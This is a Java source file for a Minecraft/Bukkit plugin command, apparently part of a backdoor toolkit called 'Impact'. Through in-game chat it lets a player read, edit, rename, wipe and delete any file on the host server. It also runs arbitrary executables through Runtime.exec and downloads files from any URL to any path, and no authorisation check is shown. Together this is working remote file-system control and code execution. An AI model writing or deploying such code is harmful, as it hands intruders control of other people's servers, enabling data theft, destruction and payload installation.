package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;

import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.List;
import java.util.Objects;
import java.util.zip.ZipOutputStream;

public class FileSystem extends Command {

    public FileSystem() {
        super("FileSystem", "FileSystem <Read | Rename | Create | Delete | Edit | Clear | Run | Install | ListFiles> (File | Directory | URL | FileName) (Line | FileName) (Replacement)", "Manage the server file system", CommandCategory.SERVER, "Files", "Fs", "FileSys");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 2) {
            sendUsage(p);
            return;
        }

        File f = new File(aliases[1]);

        if(aliases[0].equalsIgnoreCase("install")) {

            installFile(p, aliases);

        } else if(aliases[0].equalsIgnoreCase("create")) {

            createFile(p, aliases);

        } else {

            if(!f.exists()) {
                ChatUtils.sendMessage(p, "Please provide a valid file / path");
                return;
            }

            if(f.isFile()) {
                try {
                    switch (aliases[0].toLowerCase()) {
                        case "read":
                            readFile(f, p);
                            return;
                        case "rename":
                            renameFile(f, p, aliases);
                            return;
                        case "delete":
                            deleteFile(f, p);
                            return;
                        case "edit":
                            editFile(f, p, aliases);
                            return;
                        case "clear":
                            clearFiles(f, p);
                            return;
                        case "run":
                            runFile(f, p);
                            return;
                        default:
                            sendUsage(p);
                            return;
                    }
                } catch (IOException ignored) {
                    ChatUtils.sendMessage(p, "§cThis should not have happened. Please message a Impact developer about what you did to get here");
                }
            } else if(f.isDirectory()) {
                listFiles(f, p);
                return;
            }

            sendUsage(p);
        }

    }

    private void renameFile(File f, Player p, String[] aliases) {

        StringBuilder args = new StringBuilder();

        for(int i=2;i<aliases.length;i++)
            args.append(aliases[i]).append(" ");

        f.renameTo(new File(args.toString().trim()));

        ChatUtils.sendMessage(p, "The file name has been changed to: §a" + args.toString().trim());

    }

    private void readFile(File f, Player p) throws IOException {

        ChatUtils.sendMessage(p, "This is the content of §a" + f.getName());

        String line;
        int lineCount = 0;
        BufferedReader reader = new BufferedReader(new FileReader(f));

        while ((line = reader.readLine()) != null) {

            ChatUtils.sendMessage(p, "§a" + lineCount + " §7" + f.getName() + " §a" + line);

            lineCount++;
        }
    }

    private void deleteFile(File f, Player p) {

        if(f.delete()) {
            ChatUtils.sendMessage(p, "Successfully deleted §a" + f.getName());
        } else {
            ChatUtils.sendMessage(p, "Failed to delete §a" + f.getName() + "§7, Trying to delete it on exit");
            f.deleteOnExit();
        }

    }

    private void editFile(File f, Player p, String[] aliases) throws IOException {

        if(aliases.length < 3) {
            sendUsage(p);
            return;
        }

        int editLine = Integer.parseInt(aliases[2]);
        StringBuilder editString = new StringBuilder();
        List<String> lines = Files.readAllLines(f.toPath(), StandardCharsets.UTF_8);

        for(int i=3;i<aliases.length;i++)
            editString.append(aliases[i]).append(" ");

        if(lines.size() <= editLine) {

            BufferedWriter output = new BufferedWriter(new FileWriter(f, true));

            output.write("\n" + editString);
            output.flush();
            output.close();

            ChatUtils.sendMessage(p, "This line does not exist in §a" + f.getName() + "§7, so it was added to the bottom of the file");
            return;
        }

        lines.set(editLine, editString.toString());
        Files.write(f.toPath(), lines, StandardCharsets.UTF_8);

        ChatUtils.sendMessage(p, "Successfully edited §a" + f.getName());
    }

    private void listFiles(File f, Player p) {

        ChatUtils.sendMessage(p, "This are the files in §a" + f.getName());

        for(File file : Objects.requireNonNull(f.listFiles()))
            ChatUtils.sendMessage(p, file.getName() + (file.isDirectory() ? " §aFolder" : ""));
    }

    private void clearFiles(File f, Player p) throws IOException {

        ZipOutputStream zout = new ZipOutputStream(new FileOutputStream(f));
        zout.flush();
        zout.close();

        FileOutputStream out = new FileOutputStream(f);
        out.flush();
        out.close();

        ChatUtils.sendMessage(p, "Successfully cleared §a" + f.getName());
    }

    private void runFile(File f, Player p) throws IOException {

        Runtime.getRuntime().exec(f.getPath());
        ChatUtils.sendMessage(p, "Successfully ran §a" + f.getName());

    }

    private void installFile(Player p, String[] aliases) {

        try {

            if(aliases.length < 3) {
                sendUsage(p);
                return;
            }

            URL url = new URL(aliases[1]);

            InputStream in = url.openStream();
            StringBuilder editString = new StringBuilder();

            for(int i=2;i<aliases.length;i++)
                editString.append(aliases[i]).append(" ");

            Files.copy(in, Paths.get(editString.toString().trim()), StandardCopyOption.REPLACE_EXISTING);
            ChatUtils.sendMessage(p, "Successfully downloaded " + editString.toString().trim());

            in.close();

        } catch (IOException ignored) {
            ChatUtils.sendMessage(p, "You provided an invalid URL");
        }

    }

    private void createFile(Player p, String[] aliases) {

        StringBuilder name = new StringBuilder();

        for(int i=1;i<aliases.length;i++)
            name.append(aliases[i]).append(" ");

        File f = new File(name.toString().trim());

        try {

            f.createNewFile();

            ChatUtils.sendMessage(p, (f.exists() ? "Successfully created" : "Failed to create") + " the file");

        } catch (IOException ignored) {}

    }

}
